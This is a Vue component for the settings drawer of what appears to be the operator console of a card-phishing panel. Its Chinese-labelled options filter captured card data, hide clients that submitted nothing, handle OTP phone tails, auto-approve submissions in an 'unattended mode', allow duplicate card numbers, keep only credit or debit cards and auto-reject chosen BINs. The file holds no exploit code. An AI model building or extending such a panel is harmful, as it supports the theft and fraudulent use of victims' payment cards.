<script setup lang="ts">
import { ref, reactive, watch } from 'vue';

const visible = ref(false);

export interface ConsoleSettings {
  dataReverse: boolean;
  hideBinFields: boolean;
  hidePhoneField: boolean;
  onlyCardData: boolean;
  hideEmptyClients: boolean;
  hideTabBar: boolean;
  hideAddressBar: boolean;
  customOtpTail: string;
  unattendedMode: boolean;
  unattendedSeconds: number;
  allowDuplicateCard: boolean;
  cardTypeFilter: 'off' | 'C' | 'D';
  autoRejectBins: string;
}

const emit = defineEmits<{
  (e: 'settings-changed', settings: ConsoleSettings): void;
}>();

const settings = reactive<ConsoleSettings>({
  dataReverse: false,
  hideBinFields: false,
  hidePhoneField: false,
  onlyCardData: false,
  hideEmptyClients: false,
  hideTabBar: false,
  hideAddressBar: false,
  customOtpTail: '',
  unattendedMode: false,
  unattendedSeconds: 3,
  allowDuplicateCard: false,
  cardTypeFilter: 'off',
  autoRejectBins: '',
});

const STORAGE_KEY = 'payment_console_settings';

function load() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (raw) Object.assign(settings, JSON.parse(raw));
  } catch {}
}
function save() {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(settings));
}

load();
watch(settings, () => {
  save();
  emit('settings-changed', { ...settings });
}, { deep: true });

function open() { visible.value = true; }
function close() { visible.value = false; }

defineExpose({ open, close, settings, visible });
</script>

<template>
  <NDrawer :show="visible" :width="380" placement="right" @update:show="(v: boolean) => { if (!v) close(); }">
    <NDrawerContent title="会话面板设置" closable>
      <div class="settings-body">

        <div class="section-card">
          <div class="section-label">数据显示 <span class="badge badge-local">本地</span></div>
          <div class="switch-row">
            <span>数据倒序排列</span>
            <NSwitch v-model:value="settings.dataReverse" size="small" />
          </div>
          <div class="switch-row">
            <span>隐藏BIN信息（卡级/发卡行）</span>
            <NSwitch v-model:value="settings.hideBinFields" size="small" />
          </div>
          <div class="switch-row">
            <span>隐藏电话栏</span>
            <NSwitch v-model:value="settings.hidePhoneField" size="small" />
          </div>
          <div class="switch-row">
            <span>隐藏标签栏</span>
            <NSwitch v-model:value="settings.hideTabBar" size="small" />
          </div>
          <div class="switch-row">
            <span>隐藏地址栏</span>
            <NSwitch v-model:value="settings.hideAddressBar" size="small" />
          </div>
        </div>

        <div class="section-card">
          <div class="section-label">过滤设置 <span class="badge badge-local">本地</span></div>
          <div class="switch-row">
            <span>只显示填卡数据</span>
            <NSwitch v-model:value="settings.onlyCardData" size="small" />
          </div>
          <div class="switch-row">
            <span>隐藏无数据客户端</span>
            <NSwitch v-model:value="settings.hideEmptyClients" size="small" />
          </div>
          <div class="field-row">
            <label>OTP 验证码手机尾号</label>
            <NInput v-model:value="settings.customOtpTail" placeholder="输入手机尾号" maxlength="6" size="small" />
          </div>
        </div>

        <div class="section-card">
          <div class="section-label">功能设置 <span class="badge badge-global">全局</span></div>
          <div class="switch-row">
            <span>无人值守（{{ settings.unattendedSeconds }}s 后自动通过）</span>
            <NSwitch v-model:value="settings.unattendedMode" size="small" />
          </div>
          <div class="switch-row">
            <span>允许重复卡号提交</span>
            <NSwitch v-model:value="settings.allowDuplicateCard" size="small" />
          </div>
          <div class="field-row">
            <label>按卡类型筛选</label>
            <NSelect v-model:value="settings.cardTypeFilter" :options="[
              { label: '关闭', value: 'off' },
              { label: '只要 C 卡（信用卡）', value: 'C' },
              { label: '只要 D 卡（借记卡）', value: 'D' },
            ]" size="small" />
          </div>
          <div class="field-row">
            <label>自动拒绝卡头（6位BIN，逗号分隔）</label>
            <NInput v-model:value="settings.autoRejectBins" placeholder="457362,521300" type="textarea" :autosize="{ minRows: 1, maxRows: 4 }" size="small" />
          </div>
        </div>

      </div>
    </NDrawerContent>
  </NDrawer>
</template>

<style scoped>
.settings-body { display: flex; flex-direction: column; gap: 12px; padding-top: 4px; }
.section-card {
  background: rgba(128,128,128,.04);
  border: 1px solid rgba(128,128,128,.1);
  border-radius: 10px;
  padding: 14px 16px;
  display: flex; flex-direction: column; gap: 10px;
}
.section-label {
  font-size: 12px; font-weight: 700;
  color: var(--n-text-color);
  text-transform: uppercase;
  letter-spacing: 0.5px;
  margin-bottom: 2px;
  display: flex; align-items: center; gap: 8px;
}
.badge {
  font-size: 10px; font-weight: 600;
  padding: 1px 6px; border-radius: 4px;
  letter-spacing: 0;
  text-transform: none;
}
.badge-local { color: #18d46b; background: #18d46b12; }
.badge-global { color: #7968ed; background: #7968ed12; }
.field-row { }
.field-row label { font-size: 12px; color: var(--n-text-color-3); margin-bottom: 4px; display: block; }
.switch-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
</style>
